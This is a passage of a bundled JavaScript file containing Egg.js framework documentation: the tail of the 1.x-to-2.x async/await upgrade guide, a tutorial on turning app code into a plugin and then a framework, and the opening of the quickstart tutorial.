The `,paraId:15,tocIndex:4},{value:"Context",paraId:15,tocIndex:4},{value:" has changed from ",paraId:15,tocIndex:4},{value:"this",paraId:15,tocIndex:4},{value:" to the first argument ",paraId:15,tocIndex:4},{value:"ctx",paraId:15,tocIndex:4},{value:", the original ",paraId:15,tocIndex:4},{value:"scope",paraId:15,tocIndex:4},{value:" now is the second argument.",paraId:15,tocIndex:4},{value:`// old
app.role.use('user', function () {
  return !!this.user;
});

// new
app.role.use((ctx, scope) => {
  return !!ctx.user;
});

app.role.use('user', (ctx) => {
  return !!ctx.user;
});
`,paraId:16,tocIndex:4},{value:"koajs/koa-roles#13",paraId:17,tocIndex:4},{value:"eggjs/egg-userrole#9",paraId:17,tocIndex:4},{value:"Due to the complete compatibility to Egg 1.x, we can finish the upgrade quickly.",paraId:18,tocIndex:5},{value:"But in order to keep the coding style consistent, as well as a better performance improvement and more developer-friendly error stack logs, we suggest developers to make a further upgrade:",paraId:19,tocIndex:5},{value:"Use recommended code style, see ",paraId:20,tocIndex:5},{value:"Style guide",paraId:21,tocIndex:5},{value:"Use Koa style middleware",paraId:22,tocIndex:5},{value:"Change ",paraId:23,tocIndex:5},{value:"yieldable",paraId:23,tocIndex:5},{value:" to ",paraId:23,tocIndex:5},{value:"awaitable",paraId:23,tocIndex:5},{value:" in function invoke",paraId:23,tocIndex:5},{value:"2.x is compatible to 1.x-styled middleware, so it's still functional without any changes.",paraId:24,tocIndex:6},{value:"Use Koa 2's ",paraId:25,tocIndex:6},{value:"(ctx, next)",paraId:25,tocIndex:6},{value:` arguments style in callback function
`,paraId:25,tocIndex:6},{value:"The 1st argument is ",paraId:26,tocIndex:6},{value:"ctx",paraId:26,tocIndex:6},{value:", means context, it is an instance of ",paraId:26,tocIndex:6},{value:"Context",paraId:27,tocIndex:6},{value:"The 2nd argument is ",paraId:26,tocIndex:6},{value:"next",paraId:26,tocIndex:6},{value:", use await to execute it for the coming logics.",paraId:26,tocIndex:6},{value:"Using ",paraId:25,tocIndex:6},{value:"async (ctx, next) => {}",paraId:25,tocIndex:6},{value:" is not recommended, which prevents anonymous function in error stack.",paraId:25,tocIndex:6},{value:"Change ",paraId:25,tocIndex:6},{value:"yield next",paraId:25,tocIndex:6},{value:" to ",paraId:25,tocIndex:6},{value:"await next()",paraId:25,tocIndex:6},{value:".",paraId:25,tocIndex:6},{value:`// 1.x
module.exports = () => {
  return function* responseTime(next) {
    const start = Date.now();
    yield next;
    const delta = Math.ceil(Date.now() - start);
    this.set('X-Response-Time', delta + 'ms');
  };
};

// 2.x
module.exports = () => {
  return async function responseTime(ctx, next) {
    const start = Date.now();
    // Note, differ from the generator function middleware, next is a function, we're executing it here
    await next();
    const delta = Math.ceil(Date.now() - start);
    ctx.set('X-Response-Time', delta + 'ms');
  };
};
`,paraId:28,tocIndex:6},{value:"async was supported in Egg 1.x, thus if the middleware is already async-base, we could skip this section.",paraId:29,tocIndex:7},{value:"co",paraId:30,tocIndex:7},{value:" supports ",paraId:30,tocIndex:7},{value:"yieldable",paraId:30,tocIndex:7},{value:" compatibility types:",paraId:30,tocIndex:7},{value:"promises",paraId:31,tocIndex:7},{value:"array (parallel execution)",paraId:31,tocIndex:7},{value:"objects (parallel execution)",paraId:31,tocIndex:7},{value:"thunks (functions)",paraId:31,tocIndex:7},{value:"generators (delegation)",paraId:31,tocIndex:7},{value:"generator functions (delegation)",paraId:31,tocIndex:7},{value:"Despite both ",paraId:32,tocIndex:7},{value:"generator",paraId:32,tocIndex:7},{value:" and ",paraId:32,tocIndex:7},{value:"async",paraId:32,tocIndex:7},{value:" have the same program models, but we may still need to refactor our codes correspondingly after removing ",paraId:32,tocIndex:7},{value:"co",paraId:32,tocIndex:7},{value:" because of the above special handling from ",paraId:32,tocIndex:7},{value:"co",paraId:32,tocIndex:7},{value:".",paraId:32,tocIndex:7},{value:"We can replace it directly:",paraId:33,tocIndex:8},{value:`function echo(msg) {
  return Promise.resolve(msg);
}

yield echo('hi egg');
// change to
await echo('hi egg');
`,paraId:34,tocIndex:8},{value:"yeild []",paraId:35,tocIndex:9},{value:" is normally used to send concurrent requests, such as:",paraId:35,tocIndex:9},{value:`const [ news, user ] = yield [
  ctx.service.news.list(topic),
  ctx.service.user.get(uid),
];
`,paraId:36,tocIndex:9},{value:"In this case, use ",paraId:37,tocIndex:9},{value:"Promise.all()",paraId:37,tocIndex:9},{value:" to wrap it:",paraId:37,tocIndex:9},{value:`const [news, user] = await Promise.all([
  ctx.service.news.list(topic),
  ctx.service.user.get(uid),
]);
`,paraId:38,tocIndex:9},{value:"Sometimes ",paraId:39,tocIndex:10},{value:"yield {}",paraId:39,tocIndex:10},{value:" and ",paraId:39,tocIndex:10},{value:"yield map",paraId:39,tocIndex:10},{value:" can also be used to send concurrent requests, but it may be a bit complex in this place because ",paraId:39,tocIndex:10},{value:"Promise.all",paraId:39,tocIndex:10},{value:" doesn't support Object argument.",paraId:39,tocIndex:10},{value:`// app/service/biz.js
class BizService extends Service {
  * list(topic, uid) {
    return {
      news: ctx.service.news.list(topic),
      user: ctx.service.user.get(uid),
    };
  }
}

// app/controller/home.js
const { news, user } = yield ctx.service.biz.list(topic, uid);
`,paraId:40,tocIndex:10},{value:"It's recommended to use ",paraId:41,tocIndex:10},{value:"await Promise.all([])",paraId:41,tocIndex:10},{value:":",paraId:41,tocIndex:10},{value:`// app/service/biz.js
class BizService extends Service {
  list(topic, uid) {
    return Promise.all([
      ctx.service.news.list(topic),
      ctx.service.user.get(uid),
    ]);
  }
}

// app/controller/home.js
const [news, user] = await ctx.service.biz.list(topic, uid);
`,paraId:42,tocIndex:10},{value:"If the interfaces are unchangeable, e can do things below as a workaround:",paraId:43,tocIndex:10},{value:"Use ",paraId:44,tocIndex:10},{value:"app.toPromise",paraId:44,tocIndex:10},{value:" method provided by our Utils.",paraId:44,tocIndex:10},{value:"This is built on top of the ",paraId:44,tocIndex:10},{value:"co",paraId:44,tocIndex:10},{value:", so it may still cause performance issue and returning inaccurate error stacks, so this is not recommended.",paraId:44,tocIndex:10},{value:`const { news, user } = await app.toPromise(ctx.service.biz.list(topic, uid));
`,paraId:45,tocIndex:10},{value:"thunks (functions)",paraId:46,tocIndex:11},{value:"generators (delegation)",paraId:46,tocIndex:11},{value:"generator functions (delegation)",paraId:46,tocIndex:11},{value:"Use ",paraId:47,tocIndex:11},{value:"async function",paraId:47,tocIndex:11},{value:" to replace the above functions, or use ",paraId:47,tocIndex:11},{value:"app.toAsyncFunction",paraId:47,tocIndex:11},{value:" alternatively.",paraId:47,tocIndex:11},{value:"Note",paraId:48,tocIndex:11},{value:"toAsyncFunction",paraId:49,tocIndex:11},{value:" and ",paraId:49,tocIndex:11},{value:"toPromise",paraId:49,tocIndex:11},{value:" are wrappers of ",paraId:49,tocIndex:11},{value:"co",paraId:49,tocIndex:11},{value:", thus it may cause performance lost and error stack problems. So we're recommending developers to use all-chain upgrade.",paraId:49,tocIndex:11},{value:"toAsyncFunction",paraId:49,tocIndex:11},{value:" doesn't have performance lost when invokes async function.",paraId:49,tocIndex:11},{value:"@sindresorhus has written a lot ",paraId:50,tocIndex:11},{value:"promise-based helpers",paraId:50,tocIndex:11},{value:", use them together with async function could make source code more readable.",paraId:50,tocIndex:11},{value:"App developers",paraId:51,tocIndex:12},{value:" just need to update the upgraded plugins by ",paraId:51,tocIndex:12},{value:"plugin developers",paraId:51,tocIndex:12},{value:", or use ",paraId:51,tocIndex:12},{value:"egg-bin autod",paraId:51,tocIndex:12},{value:" command we've prepared to quickly update.",paraId:51,tocIndex:12},{value:"The following content is for ",paraId:52,tocIndex:12},{value:"plugin developers",paraId:52,tocIndex:12},{value:", it shows how to update the plugins:",paraId:52,tocIndex:12},{value:`Finish the upgrade items above.
`,paraId:53,tocIndex:13},{value:"Replace all ",paraId:54,tocIndex:13},{value:"generator function",paraId:54,tocIndex:13},{value:" with ",paraId:54,tocIndex:13},{value:"async function",paraId:54,tocIndex:13},{value:".",paraId:54,tocIndex:13},{value:"Upgrade middlewares.",paraId:54,tocIndex:13},{value:"Interfaces compatibility (optional), see following.",paraId:53,tocIndex:13},{value:"Release a major version.",paraId:53,tocIndex:13},{value:"In some cases, the interface provided by ",paraId:55,tocIndex:14},{value:"Plugin developers",paraId:55,tocIndex:14},{value:" supports both generator and async, normally it's wrapped by co.",paraId:55,tocIndex:14},{value:"In 2.x, we suggest ",paraId:56,tocIndex:14},{value:"async-first",paraId:56,tocIndex:14},{value:" to get a better performance and clearer error stacks.",paraId:56,tocIndex:14},{value:"If necessary, please use ",paraId:56,tocIndex:14},{value:"toAsyncFunction",paraId:56,tocIndex:14},{value:" and ",paraId:56,tocIndex:14},{value:"toPromise",paraId:56,tocIndex:14},{value:" for compatibility.",paraId:56,tocIndex:14},{value:"Like ",paraId:57,tocIndex:14},{value:"egg-schedule",paraId:57,tocIndex:14},{value:" plugin, it supports generator or async to define the tasks in application level.",paraId:57,tocIndex:14},{value:`// {app_root}/app/schedule/cleandb.js
exports.task = function* (ctx) {
  yield ctx.service.db.clean();
};

// {app_root}/app/schedule/log.js
exports.task = async function splitLog(ctx) {
  await ctx.service.log.split();
};
`,paraId:58,tocIndex:14},{value:"Plugin developers",paraId:59,tocIndex:14},{value:" could simply wrap the following raw function:",paraId:59,tocIndex:14},{value:`// https://github.com/eggjs/egg-schedule/blob/80252ef/lib/load_schedule.js#L38
task = app.toAsyncFunction(schedule.task);
`,paraId:60,tocIndex:14},{value:"Major version releasement",paraId:61,tocIndex:15},{value:"All the APIs are promise based, and there's no ",paraId:62,tocIndex:15},{value:"async",paraId:62,tocIndex:15},{value:" in source code. e.g. ",paraId:62,tocIndex:15},{value:"egg-view-nunjucks",paraId:62,tocIndex:15},{value:"Modify ",paraId:61,tocIndex:15},{value:"package.json",paraId:61,tocIndex:15},{value:"Change ",paraId:63,tocIndex:15},{value:"egg",paraId:63,tocIndex:15},{value:" in ",paraId:63,tocIndex:15},{value:"devDependencies",paraId:63,tocIndex:15},{value:" to ",paraId:63,tocIndex:15},{value:"^2.0.0",paraId:63,tocIndex:15},{value:".",paraId:63,tocIndex:15},{value:"Change ",paraId:63,tocIndex:15},{value:"engines.node",paraId:63,tocIndex:15},{value:" to ",paraId:63,tocIndex:15},{value:">=8.0.0",paraId:63,tocIndex:15},{value:".",paraId:63,tocIndex:15},{value:"Change ",paraId:63,tocIndex:15},{value:"ci.version",paraId:63,tocIndex:15},{value:" to ",paraId:63,tocIndex:15},{value:"8, 9",paraId:63,tocIndex:15},{value:", reinstall dependencies to generate new travis config files.",paraId:63,tocIndex:15},{value:"Update examples in ",paraId:61,tocIndex:15},{value:"README.md",paraId:61,tocIndex:15},{value:" with async function.",paraId:61,tocIndex:15},{value:"Write instructions for upgrade.",paraId:61,tocIndex:15},{value:"(optional) Change ",paraId:61,tocIndex:15},{value:"test/fixtures",paraId:61,tocIndex:15},{value:" to async function, and it's recommended to create a PR for code preview.",paraId:61,tocIndex:15},{value:"In case the previous versions still requires maintenance:",paraId:64,tocIndex:15},{value:"Create a new branch which based on previous ",paraId:65,tocIndex:15},{value:"1.x",paraId:65,tocIndex:15},{value:" version.",paraId:65,tocIndex:15},{value:"Change the ",paraId:65,tocIndex:15},{value:"publishConfig.tag",paraId:65,tocIndex:15},{value:" property in ",paraId:65,tocIndex:15},{value:"package.json",paraId:65,tocIndex:15},{value:" to ",paraId:65,tocIndex:15},{value:"release-1.x",paraId:65,tocIndex:15},{value:" in previous version.",paraId:65,tocIndex:15},{value:"If the previous version has new Bugfix, tag it as ",paraId:65,tocIndex:15},{value:"release-1.x",paraId:65,tocIndex:15},{value:" when publishing, so users may use ",paraId:65,tocIndex:15},{value:"npm i egg-xx@release-1",paraId:65,tocIndex:15},{value:" to import the old version.",paraId:65,tocIndex:15},{value:"See ",paraId:65,tocIndex:15},{value:"npm documentations",paraId:65,tocIndex:15},{value:".",paraId:65,tocIndex:15}]},49922:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(85705);const t=[{value:"Egg provides both ",paraId:0},{value:"Plugin",paraId:1},{value:" and ",paraId:0},{value:"Framework",paraId:2},{value:", and the former has two loading modes which are ",paraId:0},{value:"path",paraId:0},{value:" and ",paraId:0},{value:"package",paraId:0},{value:". Then how should we choose?",paraId:0},{value:"Step-by-step example will be provided to demonstrate how to start coding development progressively.",paraId:3},{value:"Find detail codes on ",paraId:4},{value:"eggjs/examples/progressive",paraId:4},{value:".",paraId:4},{value:"Assume that we are writing a code to analyze UA to implement the function below:",paraId:5,tocIndex:0},{value:"ctx.isAndroid",paraId:6,tocIndex:0},{value:"ctx.isIOS",paraId:6,tocIndex:0},{value:"You can easily write it down after previous tutorials, let's have a quick review:",paraId:7,tocIndex:0},{value:"Codes refer to ",paraId:8,tocIndex:0},{value:"step1",paraId:8,tocIndex:0},{value:".",paraId:8,tocIndex:0},{value:"Directory structure:",paraId:9,tocIndex:0},{value:`example-app
\u251C\u2500\u2500 app
\u2502   \u251C\u2500\u2500 extend
\u2502   \u2502   \u2514\u2500\u2500 context.js
\u2502   \u2514\u2500\u2500 router.js
\u251C\u2500\u2500 test
\u2502   \u2514\u2500\u2500 index.test.js
\u2514\u2500\u2500 package.json
`,paraId:10,tocIndex:0},{value:"Core code:",paraId:11,tocIndex:0},{value:`// app/extend/context.js
module.exports = {
  get isIOS() {
    const iosReg = /iphone|ipad|ipod/i;
    return iosReg.test(this.get('user-agent'));
  },
};
`,paraId:12,tocIndex:0},{value:"Obviously, the logic is universal that can be written as a plugin.",paraId:13,tocIndex:1},{value:"But since function might not be perfect at the beginning, it might be difficult to maintain if encapsulated into a plugin directly.",paraId:14,tocIndex:1},{value:"We can write the code as the format of plugin, but not separate out.",paraId:15,tocIndex:1},{value:"Codes refer to ",paraId:16,tocIndex:1},{value:"step2",paraId:16,tocIndex:1},{value:".",paraId:16,tocIndex:1},{value:"New directory structure:",paraId:17,tocIndex:1},{value:`example-app
\u251C\u2500\u2500 app
\u2502   \u2514\u2500\u2500 router.js
\u251C\u2500\u2500 config
\u2502   \u2514\u2500\u2500 plugin.js
\u251C\u2500\u2500 lib
\u2502   \u2514\u2500\u2500 plugin
\u2502       \u2514\u2500\u2500 egg-ua
\u2502           \u251C\u2500\u2500 app
\u2502           \u2502   \u2514\u2500\u2500 extend
\u2502           \u2502       \u2514\u2500\u2500 context.js
\u2502           \u2514\u2500\u2500 package.json
\u251C\u2500\u2500 test
\u2502   \u2514\u2500\u2500 index.test.js
\u2514\u2500\u2500 package.json
`,paraId:18,tocIndex:1},{value:"Core code:",paraId:19,tocIndex:1},{value:"app/extend/context.js",paraId:20,tocIndex:1},{value:" move to ",paraId:20,tocIndex:1},{value:"lib/plugin/egg-ua/app/extend/context.js",paraId:20,tocIndex:1},{value:".",paraId:20,tocIndex:1},{value:"lib/plugin/egg-ua/package.json",paraId:21,tocIndex:1},{value:" declares plugin.",paraId:21,tocIndex:1},{value:`{
  "eggPlugin": {
    "name": "ua"
  }
}
`,paraId:22,tocIndex:1},{value:"config/plugin.js",paraId:23,tocIndex:1},{value:" uses ",paraId:23,tocIndex:1},{value:"path",paraId:23,tocIndex:1},{value:" to mount the plugin.",paraId:23,tocIndex:1},{value:`// config/plugin.js
const path = require('path');
exports.ua = {
  enable: true,
  path: path.join(__dirname, '../lib/plugin/egg-ua'),
};
`,paraId:24,tocIndex:1},{value:"The functions of module become better after a period of developing so we could extract it out as an independent plugin.",paraId:25,tocIndex:2},{value:"We extract an egg-ua plugin and have a quick review as below. Details refer to ",paraId:26,tocIndex:2},{value:"Plugin Development",paraId:27,tocIndex:2},{value:".",paraId:26,tocIndex:2},{value:"Directory structure:",paraId:28,tocIndex:2},{value:`egg-ua
\u251C\u2500\u2500 app
\u2502   \u2514\u2500\u2500 extend
\u2502       \u2514\u2500\u2500 context.js
\u251C\u2500\u2500 test
\u2502   \u251C\u2500\u2500 fixtures
\u2502   \u2502   \u2514\u2500\u2500 test-app
\u2502   \u2502       \u251C\u2500\u2500 app
\u2502   \u2502       \u2502   \u2514\u2500\u2500 router.js
\u2502   \u2502       \u2514\u2500\u2500 package.json
\u2502   \u2514\u2500\u2500 ua.test.js
\u2514\u2500\u2500 package.json
`,paraId:29,tocIndex:2},{value:"Codes refer to ",paraId:30,tocIndex:2},{value:"step3/egg-ua",paraId:30,tocIndex:2},{value:".",paraId:30,tocIndex:2},{value:"Then modify the application, details refer to ",paraId:31,tocIndex:2},{value:"step3/example-app",paraId:31,tocIndex:2},{value:".",paraId:31,tocIndex:2},{value:"Remove directory ",paraId:32,tocIndex:2},{value:"lib/plugin/egg-ua",paraId:32,tocIndex:2},{value:".",paraId:32,tocIndex:2},{value:"Declare dependencies ",paraId:32,tocIndex:2},{value:"egg-ua",paraId:32,tocIndex:2},{value:" in ",paraId:32,tocIndex:2},{value:"package.json",paraId:32,tocIndex:2},{value:".",paraId:32,tocIndex:2},{value:"Change type to ",paraId:32,tocIndex:2},{value:"package",paraId:32,tocIndex:2},{value:" in ",paraId:32,tocIndex:2},{value:"config/plugin.js",paraId:32,tocIndex:2},{value:".",paraId:32,tocIndex:2},{value:`// config/plugin.js
exports.ua = {
  enable: true,
  package: 'egg-ua',
};
`,paraId:33,tocIndex:2},{value:"Note\uFF1AWe can use ",paraId:34,tocIndex:2},{value:"npm link",paraId:34,tocIndex:2},{value:" for local test before releasing the plugin. Details refer to ",paraId:34,tocIndex:2},{value:"npm-link",paraId:34,tocIndex:2},{value:".",paraId:34,tocIndex:2},{value:`$ cd example-app
$ npm link ../egg-ua
$ npm i
$ npm test
`,paraId:35,tocIndex:2},{value:"After repeating the process above, we accumulate a few plugins and configurations, and might find that most of our team projects are using them.",paraId:36,tocIndex:3},{value:"At that time, you can consider abstracting them as a framework which is suitable for business scenarios.",paraId:37,tocIndex:3},{value:"Firstly, abstract the example-framework as below. Let's have a quick review, details refer to ",paraId:38,tocIndex:3},{value:"Framework",paraId:39,tocIndex:3},{value:".",paraId:38,tocIndex:3},{value:"Directory structure:",paraId:40,tocIndex:3},{value:`example-framework
\u251C\u2500\u2500 config
\u2502   \u251C\u2500\u2500 config.default.js
\u2502   \u2514\u2500\u2500 plugin.js
\u251C\u2500\u2500 lib
\u2502   \u251C\u2500\u2500 agent.js
\u2502   \u2514\u2500\u2500 application.js
\u251C\u2500\u2500 test
\u2502   \u251C\u2500\u2500 fixtures
\u2502   \u2502   \u2514\u2500\u2500 test-app
\u2502   \u2514\u2500\u2500 framework.test.j.
\u251C\u2500\u2500 README.md
\u251C\u2500\u2500 index.js
\u2514\u2500\u2500 package.json
`,paraId:41,tocIndex:3},{value:"Codes refer to ",paraId:42,tocIndex:3},{value:"example-framework",paraId:42,tocIndex:3},{value:".",paraId:42,tocIndex:3},{value:"Remove the dependencies of plugins such as ",paraId:42,tocIndex:3},{value:"egg-ua",paraId:42,tocIndex:3},{value:" and remove it from example-app, then configure them into the ",paraId:42,tocIndex:3},{value:"package.json",paraId:42,tocIndex:3},{value:" and ",paraId:42,tocIndex:3},{value:"config/plugin.js",paraId:42,tocIndex:3},{value:" of the framework.",paraId:42,tocIndex:3},{value:"Then modify the application, details refer to ",paraId:43,tocIndex:3},{value:"step4/example-app",paraId:43,tocIndex:3},{value:".",paraId:43,tocIndex:3},{value:"Remove ",paraId:44,tocIndex:3},{value:"egg-ua",paraId:44,tocIndex:3},{value:" in ",paraId:44,tocIndex:3},{value:"config/plugin.js",paraId:44,tocIndex:3},{value:".",paraId:44,tocIndex:3},{value:"Remove ",paraId:44,tocIndex:3},{value:"egg-ua",paraId:44,tocIndex:3},{value:" in ",paraId:44,tocIndex:3},{value:"package.json",paraId:44,tocIndex:3},{value:".",paraId:44,tocIndex:3},{value:"declare ",paraId:44,tocIndex:3},{value:"example-framework",paraId:44,tocIndex:3},{value:" in ",paraId:44,tocIndex:3},{value:"package.json",paraId:44,tocIndex:3},{value:" and configure the ",paraId:44,tocIndex:3},{value:"egg.framework",paraId:44,tocIndex:3},{value:".",paraId:44,tocIndex:3},{value:`{
  "name": "progressive",
  "version": "1.0.0",
  "private": true,
  "egg": {
    "framework": "example-framework"
  },
  "dependencies": {
    "example-framework": "*"
  }
}
`,paraId:45,tocIndex:3},{value:"Note\uFF1AWe can use ",paraId:46,tocIndex:3},{value:"npm link",paraId:46,tocIndex:3},{value:" for local test before releasing the framework ",paraId:46,tocIndex:3},{value:"npm-link",paraId:46,tocIndex:3},{value:".",paraId:46,tocIndex:3},{value:`$ cd example-app
$ npm link ../egg-framework
$ npm i
$ npm test
`,paraId:47,tocIndex:3},{value:"In conclusion, we can see how to make the framework evolution step by step which benefits from Egg's powerful plugin mechanism, code co-build, reusability and modularity.",paraId:48,tocIndex:4},{value:"In general, put codes into ",paraId:49,tocIndex:4},{value:"lib/plugin",paraId:49,tocIndex:4},{value:" if they can be reused in the application.",paraId:49,tocIndex:4},{value:"Separate it into a ",paraId:50,tocIndex:4},{value:"node module",paraId:50,tocIndex:4},{value:" when plugin becomes stable.",paraId:50,tocIndex:4},{value:"Application with relatively reusable codes will work as a separate plugin.",paraId:51,tocIndex:4},{value:"Abstract it as framework to release after application become certain solutions of specified business scenario.",paraId:52,tocIndex:4},{value:"It would be a great improvement in the efficiency of teamwork after plugins were extracted, modularized and finally became a framework, because other projects could reuse codes by just using ",paraId:53,tocIndex:4},{value:"npm install",paraId:53,tocIndex:4},{value:".",paraId:53,tocIndex:4},{value:"Note\uFF1AWhether it's the application/plugin/framework, unittest is necessary and try to reach 100% coverage",paraId:54,tocIndex:4}]},56438:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(95867);const t=[{value:`This guide covers getting up and running a real example using Egg.
By following along with this guide step by step, you can quickly get started with Egg development.`,paraId:0},{value:"Operating System: Linux, OS X or Windows.",paraId:1,tocIndex:0},{value:"Node.js Runtime: 8.x or newer; it is recommended that you use ",paraId:1,tocIndex:0},{value:"LTS Releases",paraId:1,tocIndex:0},{value:".",paraId:1,tocIndex:0},{value:`To begin with, let's quickly initialize the project by using a scaffold,
which will quickly generate some of the major pieces of the application (`,paraId:2,tocIndex:1},{value:"npm >=6.1.0",paraId:2,tocIndex:1},{value:").",paraId:2,tocIndex:1},{value:`$ mkdir egg-example && cd egg-example
$ npm init egg --type=simple
$ npm i
`,paraId:3,tocIndex:1},{value:"Then get up and run by using the following commands.",paraId:4,tocIndex:1},{value:`$ npm run dev
$ open http://localhost:7001
`,paraId:5,tocIndex:1},{value:"Usually you can just use ",paraId:6,tocIndex:2},{value:"npm init egg",paraId:6,tocIndex:2},{value:` of the previous section,
choose a scaffold that best fits your business model and quickly generate a project,
then get started with the development.`,paraId:6,tocIndex:2},{value:"However, in this section, instead of using scaffolds we will build a project called ",paraId:7,tocIndex:2},{value:"Egg HackerNews",paraId:7,tocIndex:2},{value:" step by step, for a better understanding of how it works.",paraId:7,tocIndex:2},{value:"First let's create the project directory and initialize its structure.",paraId:8,tocIndex:3},{value:`$ mkdir egg-example
$ cd egg-example
$ npm init
$ npm i egg --save
$ npm i egg-bin --save-dev
`,paraId:9,tocIndex:3},{value:"Then add ",paraId:10,tocIndex:3},{value:"npm scripts",paraId:10,tocIndex:3},{value:" to ",paraId:10,tocIndex:3},{value:"package.json",paraId:10,tocIndex:3},{value:".",paraId:10,tocIndex:3},{value:`{
  "name": "egg-example",
  "scripts": {
    "dev": "egg-bin dev"
  }
}
`,paraId:11,tocIndex:3},{value:`If you are familiar with the MVC architecture,
you might have already guessed that the first thing to create
is a `,paraId:12,tocIndex:4},{value:"controller",paraId:13,tocIndex:4},{value:" and ",paraId:12,tocIndex:4},{value:"router",paraId:14,tocIndex:4},{value:".",paraId:12,tocIndex:4},{value:`// app/controller/home.js
const Controller = require('egg').Controller;

class HomeController extends Controller {
  async index() {
    this.ctx.body = 'Hello world';
  }
}

module.exports = HomeController;
`,paraId:15,tocIndex:4},{value:"Then edit the router file and add a mapping.",paraId:16,tocIndex:4},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.get('/', controller.home.index);
};
`,paraId:17,tocIndex:4},{value:"Then add a ",paraId:18,tocIndex:4},{value:"configuration",paraId:19,tocIndex:4},{value:" file:",paraId:18,tocIndex:4},{value:`// config/config.default.js
exports.keys = <YOUR_SECURITY_COOKIE_KEYS>;
`,paraId:20,tocIndex:4},{value:"The project directory looks like this:",paraId:21,tocIndex:4},{value:`egg-example
\u251C\u2500\u2500 app
\u2502   \u251C\u2500\u2500 controller
\u2502   \u2502   \u2514\u2500\u2500 home.js
\u2502   \u2514\u2500\u2500 router.js
\u251C\u2500\u2500 config
\u2502   \u2514\u2500\u2500 config.default.js
\u2514\u2500\u2500 package.json
`,paraId:22,tocIndex:4},{value:"For more information about directory structure, see ",paraId:23,tocIndex:4},{value:"Directory Structure",paraId:24,tocIndex:4},{value:".",paraId:23,tocIndex:4},{value:"Now you can start up the Web Server and see your application in action.",paraId:25,tocIndex:4},{value:`$ npm run dev
$ open http://localhost:7001
`,paraId:26,tocIndex:4},{value:"Note\uFF1A",paraId:27,tocIndex:4},{value:"You could write ",paraId:28,tocIndex:4},{value:"Controller",paraId:28,tocIndex:4},{value:" with ",paraId:28,tocIndex:4},{value:"class",paraId:28,tocIndex:4},{value:" or ",paraId:28,tocIndex:4},{value:"exports",paraId:28,tocIndex:4},{value:" style, see more detail at ",paraId:28,tocIndex:4},{value:"Controller",paraId:29,tocIndex:4},{value:".",paraId:28,tocIndex:4},{value:"And ",paraId:28,tocIndex:4},{value:"Config",paraId:28,tocIndex:4},{value:" could write with ",paraId:28,tocIndex:4},{value:"module.exports",paraId:28,tocIndex:4},{value:" or ",paraId:28,tocIndex:4},{value:"exports",paraId:28,tocIndex:4},{value:" style, see more detail at ",paraId:28,tocIndex:4},{value:"Node.js modules docs",paraId:28,tocIndex:4},{value:".",paraId:28,tocIndex:4},{value:"Egg has a built-in plugin called ",paraId:30,tocIndex:5},{value:"static",paraId:30,tocIndex:5},{value:`.
In production, it is recommended that you deploy static assets to CDN instead of using this plugin.`,paraId:30,tocIndex:5},{value:"static",paraId:31,tocIndex:5},{value:" maps ",paraId:31,tocIndex:5},{value:"/public/*",paraId:31,tocIndex:5},{value:" to the directory ",paraId:31,tocIndex:5},{value:"app/public/*",paraId:31,tocIndex:5},{value:" by default.",paraId:31,tocIndex:5},{value:"In this case, we just need to put our static assets into the directory ",paraId:32,tocIndex:5},{value:"app/public",paraId:32,tocIndex:5},{value:".",paraId:32,tocIndex:5},{value:`app/public
\u251C\u2500\u2500 css
\u2502   \u2514\u2500\u2500 news.css
\u2514\u2500\u2500 js
    \u251C\u2500\u2500 lib.js
    \u2514\u2500\u2500 news.js
`,paraId:33,tocIndex:5},{value:`In most cases, data are usually read, processed and rendered by the templates before being presented to the user.
Thus we need to introduce corresponding template engines to handle it.`,paraId:34,tocIndex:6},{value:`Egg does not force to use any particular template engines,
but specifies the `,paraId:35,tocIndex:6},{value:"View Plugins Specification",paraId:36,tocIndex:6},{value:`
to allow the developers to use different plugins for their individual needs instead.`,paraId:35,tocIndex:6},{value:"For more information, cf. ",paraId:37,tocIndex:6},{value:"View",paraId:38,tocIndex:6},{value:".",paraId:37,tocIndex:6},{value:"In this example, we will use ",paraId:39,tocIndex:6},{value:"Nunjucks",paraId:39,tocIndex:6},{value:".",paraId:39,tocIndex:6},{value:"First install the corresponding plugin ",paraId:40,tocIndex:6},{value:"egg-view-nunjucks",paraId:40,tocIndex:6},{value:".",paraId:40,tocIndex:6},{value:`$ npm i egg-view-nunjucks --save
`,paraId:41,tocIndex:6},{value:"And enable it.",paraId:42,tocIndex:6},{value:`// config/plugin.js
exports.nunjucks = {
  enable: true,
  package: 'egg-view-nunjucks',
};
`,paraId:43,tocIndex:6},{value:`// config/config.default.js
exports.keys = <YOUR_SECURITY_COOKE_KEYS>;
// add view's configurations
exports.view = {
  defaultViewEngine: 'nunjucks',
  mapping: {
    '.tpl': 'nunjucks',
  },
};
`,paraId:44,tocIndex:6},{value:"Carefully! ",paraId:45,tocIndex:6},{value:"config",paraId:45,tocIndex:6},{value:" dir, not ",paraId:45,tocIndex:6},{value:"app/config",paraId:45,tocIndex:6},{value:"!",paraId:45,tocIndex:6},{value:`Then create a template for the index page.
This usually goes to the app/view directory.`,paraId:46,tocIndex:6},{value:`<!-- app/view/news/list.tpl -->
<html>
  <head>
    <title>Egg HackerNews Clone</title>
    <link rel="stylesheet" href="/public/css/news.css" />
  </head>
  <body>
    <ul class="news-view view">
      {% for item in list %}
      <li class="item">
        <a href="{{ item.url }}">{{ item.title }}</a>
      </li>
      {% endfor %}
    </ul>
  </body>
</html>
`,paraId:47,tocIndex:6},{value:"Then add a controller and router.",paraId:48,tocIndex:6},{value:`// app/controller/news.js
const Controller = require('egg').Controller;

class NewsController extends Controller {
  async list() {
    const dataList = {
      list: [
        { id: 1, title: 'this is news 1', url: '/news/1' },
        { id: 2, title: 'this is news 2', url: '/news/2' },
      ],
    };
    await this.ctx.render('news/list.tpl', dataList);
  }
}

module.exports = NewsController;

// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.get('/', controller.home.index);
  router.get('/news', controller.news.list);
};
`,paraId:49,tocIndex:6},{value:"Open a browser window and navigate to ",paraId:50,tocIndex:6},{value:"http://localhost:7001/news",paraId:50,tocIndex:6},{value:`.
You should be able to see the rendered page.`,paraId:50,tocIndex:6},{value:"Tip\uFF1AIn development, Egg enables the ",paraId:51,tocIndex:6},{value:"development",paraId:51,tocIndex:6},{value:" plugin by default, which reloads your worker process when changes are made to your back-end code.",paraId:51,tocIndex:6},{value:`In practice, controllers usually won't generate data on their own,
neither will they contain complicated business logic.
Complicated business logic should be abstracted as
